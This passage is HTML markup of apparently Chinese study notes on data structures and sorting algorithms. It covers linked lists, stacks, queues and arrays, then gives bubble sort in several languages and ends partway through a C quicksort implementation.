&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Kruskal算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;堆排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Prim算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;归并排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Dijkstra算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;桶排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;基数排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org66f1579&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org66f1579&quot;&gt;线性结构&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org66f1579&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
常用的线性结构有：线性表，栈，队列，循环队列，数组。
&lt;/pre&gt;

&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;线性表：是一种线性结构，它是具有相同类型的n(n≥0)个数据元素组成的有限序列。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;顺序表：是在计算机内存中以数组的形式保存的线性表，是指用一组地址连续的存储单元依次存储数据元素的线性结构。&lt;/li&gt;
&lt;li&gt;链表（Linked list）
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单链表：它由节点组成，每个节点都包含下一个节点的指针。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单链表分为：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;动态单链表&lt;/li&gt;
&lt;li&gt;静态单链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
单链表操作图示
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-01.jpg&quot; alt=&quot;linked-list-01.jpg&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
表头为空，表头的后继节点是&quot;节点10&quot;，&quot;节点10&quot;的后继节点是&quot;节点20&quot;。
&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;删除节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-02.jpg&quot; alt=&quot;linked-list-02.jpg&quot; /&gt;
&lt;b&gt;添加节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-03.jpg&quot; alt=&quot;linked-list-03.jpg&quot; /&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;单链表的特点是：节点的链接方向是单向的；相对于数组来说，单链表的的随机访问速度较慢，但是单链表删除/添加数据的效率很高。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;双链表：它也是由节点组成，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
双链表操作图示
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-04.jpg&quot; alt=&quot;linked-list-04.jpg&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
表头为空，表头的后继节点为&quot;节点10&quot;(数据为10的节点)；&quot;节点10&quot;的后继节点是&quot;节点20&quot;(数据为10的节点)，&quot;节点20&quot;的前继节点是&quot;节点10&quot;；&quot;节点20&quot;的后继节点是&quot;节点30&quot;，&quot;节点30&quot;的前继节点是&quot;节点20&quot;；...；末尾节点的后继节点是表头。
&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;删除节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-05.jpg&quot; alt=&quot;linked-list-05.jpg&quot; /&gt;
&lt;b&gt;添加节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-06.jpg&quot; alt=&quot;linked-list-06.jpg&quot; /&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;代码实现
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Java
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot; id=&quot;org0ad7128&quot;&gt;&lt;span style=&quot;color: #E6DB74;&quot;&gt;/**&lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt; * Java &amp;#23454;&amp;#29616;&amp;#30340;&amp;#21452;&amp;#21521;&amp;#38142;&amp;#34920;&amp;#12290; &lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt; * &amp;#27880;&amp;#65306;java&amp;#33258;&amp;#24102;&amp;#30340;&amp;#38598;&amp;#21512;&amp;#21253;&amp;#20013;&amp;#26377;&amp;#23454;&amp;#29616;&amp;#21452;&amp;#21521;&amp;#38142;&amp;#34920;&amp;#65292;&amp;#36335;&amp;#24452;&amp;#26159;:java.util.LinkedList&lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt; */&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #F92672;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;DoubleLink&lt;/span&gt;&amp;lt;&lt;span style=&quot;color: #66D9EF;&quot;&gt;T&lt;/span&gt;&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;循环链表
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单循环链表&lt;/li&gt;
&lt;li&gt;双循环链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;栈（stack）：是计算机科学中一种特殊的串列形式的抽象数据类型，按照后进先出（LIFO, Last In First Out）的原理运作。其特殊之处在于只能允许在链表或数组的一端（称为堆栈顶端指针，英语：top）进行加入数据（英语：push）和输出数据（英语：pop）的运算。&lt;/li&gt;
&lt;li&gt;队列：又称为伫列（queue），是先进先出（FIFO, First-In-First-Out）的线性表。队列只允许在后端（称为rear）进行插入操作，在前端（称为front）进行删除操作。&lt;/li&gt;
&lt;li&gt;数组：在计算机科学中，数组数据结构（英语：array data structure），简称数组（英语：Array），是由相同类型的元素（element）的集合所组成的数据结构，分配一块连续的内存来存储。
&lt;img src=&quot;http://localhost:4000/assets/images/array-data-structure-01.jpg&quot; alt=&quot;array-data-structure-01.jpg&quot; /&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;数组的特点是：数据的元素在上下界内是连续的；随机访问速度快。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9620dcf&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org9620dcf&quot;&gt;树&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org9620dcf&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9bfac9f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9bfac9f&quot;&gt;二叉树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbe67ab6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgbe67ab6&quot;&gt;AVL 树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1a4cf54&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1a4cf54&quot;&gt;伸展树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd4681b8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd4681b8&quot;&gt;红黑树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org63a9384&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org63a9384&quot;&gt;哈夫曼树&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org01377f4&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org01377f4&quot;&gt;堆&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2cca4d3&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2cca4d3&quot;&gt;图&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8f3daef&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org8f3daef&quot;&gt;排序算法&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org8f3daef&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org68f7db8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org68f7db8&quot;&gt;冒泡排序(BubbleSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org68f7db8&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9caa6b9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9caa6b9&quot;&gt;介绍(Introduction)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-org9caa6b9&quot;&gt;
&lt;p&gt;
&lt;b&gt;en&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
Bubblesort is a popular,but inefficient,sorting algorithm. It works by repeatedly swapping adjacent elements that are out of order.
&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;cn&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
冒泡排序是一种较简单的排序算法。它会遍历若干次要排序的数列，每次遍历时，它都会从前往后依次的比较相邻两个数的大小；如果前者比后者大，
则交换它们的位置。这样，一次遍历之后，最大的元素就在数列的末尾！ 采用相同的方法再次遍历时，第二大的元素就被排列在最大元素之前。重复
此操作，直到整个数列都有序为止！
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdcebedb&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgdcebedb&quot;&gt;伪代码(pseudo code)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orgdcebedb&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;pseudo code&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;for i = 1 to A.length - 1
    for j = A:length downto i + 1
        if A[j] &amp;lt; A[j-1]   
            exchange A[j] with A[j - 1]
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga44b371&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orga44b371&quot;&gt;时间复杂度和稳定性&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orga44b371&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
冒泡排序的时间复杂度是O(N2)。
假设被排序的数列中有N个数。遍历一趟的时间复杂度是O(N)，需要遍历多少次呢？N-1次！因此，冒泡排序的时间复杂度是O(N2)。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
冒泡排序是稳定的算法，它满足稳定算法的定义。
算法稳定性 -- 假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org59867b0&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org59867b0&quot;&gt;实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-org59867b0&quot;&gt;
&lt;p&gt;
&lt;b&gt;C&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 2: &lt;/span&gt;C&lt;/label&gt;&lt;pre class=&quot;src src-C&quot;&gt;&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;,&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;;
&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;flag&lt;/span&gt;; &lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#26631;&amp;#35760;&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt; (i=n-1; i&amp;gt;0; i--)
{
    flag = 0; &lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#21021;&amp;#22987;&amp;#21270;&amp;#26631;&amp;#35760;&amp;#20026;0&lt;/span&gt;
    &lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#23558;a[0...i]&amp;#20013;&amp;#26368;&amp;#22823;&amp;#30340;&amp;#25968;&amp;#25454;&amp;#25918;&amp;#22312;&amp;#26411;&amp;#23614;&lt;/span&gt;
    &lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt; (j=0; j&amp;lt;i; j++)
    {
        &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt; (a[j] &amp;gt; a[j+1])
        {
            swap(a[j], a[j+1]);
            flag = 1;    &lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#33509;&amp;#21457;&amp;#29983;&amp;#20132;&amp;#25442;&amp;#65292;&amp;#21017;&amp;#35774;&amp;#26631;&amp;#35760;&amp;#20026;1&lt;/span&gt;
        }
    }
    &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt; (flag==0)
        &lt;span style=&quot;color: #F92672;&quot;&gt;break&lt;/span&gt;;&lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#33509;&amp;#27809;&amp;#21457;&amp;#29983;&amp;#20132;&amp;#25442;&amp;#65292;&amp;#21017;&amp;#35828;&amp;#26126;&amp;#25968;&amp;#21015;&amp;#24050;&amp;#26377;&amp;#24207;&amp;#12290;&lt;/span&gt;
} 
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;C#&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 3: &lt;/span&gt;C#&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;//Core code.
for (int i = 0&lt;span style=&quot;color: #75715E;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;i &amp;lt; arrInt.Length - 1; i++)&lt;/span&gt;
{
    for (int j = 1&lt;span style=&quot;color: #75715E;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;j &amp;lt; arrInt.Length - i; j++)&lt;/span&gt;
    {
        if (arrInt[j] &amp;lt; arrInt[j - 1])
        {
            //&amp;#20132;&amp;#25442;&amp;#20540;
            int temp = arrInt[j]&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
            arrInt[j] = arrInt[j - 1]&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
            arrInt[j - 1] = temp&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        }
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;Java&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 4: &lt;/span&gt;Java&lt;/label&gt;&lt;pre class=&quot;src src-java&quot;&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #F92672;&quot;&gt;static&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color: #A6E22E;&quot;&gt;BubbleSort&lt;/span&gt;(&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt;[] &lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;,&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;num&lt;/span&gt;) {
    &lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt; (&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt; = 0; i &amp;lt; arr.&lt;span style=&quot;color: #66D9EF;&quot;&gt;length&lt;/span&gt;; i++) {
            &lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt; (&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt; = num-1; j &amp;gt;i; j--) {
                    &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt; (arr[i]&amp;gt;arr[j]) {
                            &lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;temp&lt;/span&gt;=arr[i];
                            arr[i]=arr[j];
                            arr[j]=temp;
                    }
            }
    }
    &lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt;(&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;k&lt;/span&gt;=0;k&amp;lt;&lt;span style=&quot;color: #66D9EF;&quot;&gt;num&lt;/span&gt;;k++){
            System.out.print(arr[k]+&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot; &quot;&lt;/span&gt;);
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;PHP&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 5: &lt;/span&gt;PHP&lt;/label&gt;&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;function&lt;/span&gt; &lt;span style=&quot;color: #A6E22E;&quot;&gt;BubbleSort&lt;/span&gt;($&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;){
        &lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt;($&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;=0;$&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;&amp;lt;count($&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;);$&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;++){
                &lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt;($&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;=0;$&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;&amp;lt;$&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;;$&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;++){
                        &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt;($&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;]&amp;gt;$&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;]){
                                $&lt;span style=&quot;color: #FD971F;&quot;&gt;temp&lt;/span&gt; = $&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;];
                                $&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;] = $&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;];
                                $&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;] = $&lt;span style=&quot;color: #FD971F;&quot;&gt;temp&lt;/span&gt;;
                        }
                }
        }
        &lt;span style=&quot;color: #F92672;&quot;&gt;foreach&lt;/span&gt;($&lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt; as $&lt;span style=&quot;color: #FD971F;&quot;&gt;value&lt;/span&gt;){
                &lt;span style=&quot;color: #F92672;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FD971F;&quot;&gt;value&lt;/span&gt;.&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot; &quot;&lt;/span&gt;;
        }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org331cef0&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org331cef0&quot;&gt;快速排序(QuickSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org331cef0&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge78b31f&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orge78b31f&quot;&gt;介绍(Introduction)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orge78b31f&quot;&gt;
&lt;p&gt;
&lt;b&gt;cn&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
快速排序(Quick Sort)使用分治法策略。
基本思想是：选择一个基准数，通过一趟排序将要排序的数据分割成独立的两部分；其中一部分的所有数据都比另外
一部分的所有数据都要小。然后，再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此
达到整个数据变成有序序列。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
快速排序流程：
(1) 从数列中挑出一个基准值。
(2) 将所有比基准值小的摆放在基准前面，所有比基准值大的摆在基准的后面(相同的数可以到任一边)；在这个分区退出之后，该基准就处于数列的中间位置。
(3) 递归地把&quot;基准值前面的子数列&quot;和&quot;基准值后面的子数列&quot;进行排序。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5ce27cc&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org5ce27cc&quot;&gt;伪代码(pseudo code)&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8937cf9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8937cf9&quot;&gt;时间复杂度和稳定&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-org8937cf9&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
快速排序的时间复杂度在最坏情况下是O(N2)，平均的时间复杂度是O(N*lgN)。 
这句话很好理解：假设被排序的数列中有N个数。遍历一次的时间复杂度是O(N)，需要遍历多少次呢？至少lg(N+1)次，最多N次。
(01) 为什么最少是lg(N+1)次？快速排序是采用的分治法进行遍历的，我们将它看作一棵二叉树，它需要遍历的次数就是二叉树的深度，而根据完全二叉树的定义，它的深度至少是lg(N+1)。因此，快速排序的遍历次数最少是lg(N+1)次。
(02) 为什么最多是N次？这个应该非常简单，还是将快速排序看作一棵二叉树，它的深度最大是N。因此，快读排序的遍历次数最多是N次。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
快速排序是不稳定的算法，它不满足稳定算法的定义。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge3a6908&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orge3a6908&quot;&gt;实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orge3a6908&quot;&gt;
&lt;p&gt;
&lt;b&gt;C&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-C&quot;&gt;&lt;span style=&quot;color: #E6DB74;&quot;&gt;/**&lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt;* arr -- &amp;#24453;&amp;#25490;&amp;#24207;&amp;#30340;&amp;#25968;&amp;#32452;&lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt;* left -- &amp;#25968;&amp;#32452;&amp;#30340;&amp;#24038;&amp;#36793;&amp;#30028;&lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt;* right -- &amp;#25968;&amp;#32452;&amp;#30340;&amp;#21491;&amp;#36793;&amp;#30028;&lt;/span&gt;
&lt;span style=&quot;color: #E6DB74;&quot;&gt;*/&lt;/span&gt;
&lt;span style=&quot;color: #66D9EF;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color: #A6E22E;&quot;&gt;quick_sort&lt;/span&gt;(&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;arr&lt;/span&gt;[],&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;left&lt;/span&gt;,&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;right&lt;/span&gt;){
    &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt;(left &amp;lt; right){
            &lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;,&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;,&lt;span style=&quot;color: #FD971F;&quot;&gt;k&lt;/span&gt;;
            i = left;
            j = right;
            k = arr[i];
            &lt;span style=&quot;color: #F92672;&quot;&gt;while&lt;/span&gt;(i &amp;lt; j){
                    &lt;span style=&quot;color: #F92672;&quot;&gt;while&lt;/span&gt;(i &amp;lt; j &amp;amp;&amp;amp; arr[j] &amp;gt; k){
                            j--; &lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#20174;&amp;#21491;&amp;#24448;&amp;#24038;&amp;#25214;&amp;#19968;&amp;#20010;&amp;#23567;&amp;#20110; k &amp;#30340;&amp;#25968;&lt;/span&gt;
                    }
                    &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt;(i &amp;lt; j){
                            arr[i++] = arr[j];
                    }
                    &lt;span style=&quot;color: #F92672;&quot;&gt;while&lt;/span&gt;(i&amp;lt;j &amp;amp;&amp;amp; arr[i] &amp;lt; k){
